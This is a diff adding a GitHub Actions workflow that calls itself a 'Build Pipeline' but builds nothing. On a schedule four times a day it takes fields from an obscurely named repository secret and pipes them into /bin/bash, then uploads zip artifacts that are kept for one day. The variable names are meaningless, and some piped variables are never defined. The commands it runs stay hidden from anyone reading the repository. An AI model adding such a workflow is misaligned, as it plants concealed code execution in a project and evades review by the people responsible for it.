@@ -1,0 +1,30 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          ayx4: ${{ secrets.ayx4 }}
+        run: |
+          printf '%s' "$ayx4" | jq -r .zglis766 | /bin/bash
+          printf '%s' "$nmrot0036" | jq -r .c6 | /bin/bash
+          echo $p012 | jq -r .wd04 | /bin/bash
+          printf '%s' "$ii2" | jq -r .klpr3 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: BnQagHLi
+          path: "*.zip"
+          retention-days: 1
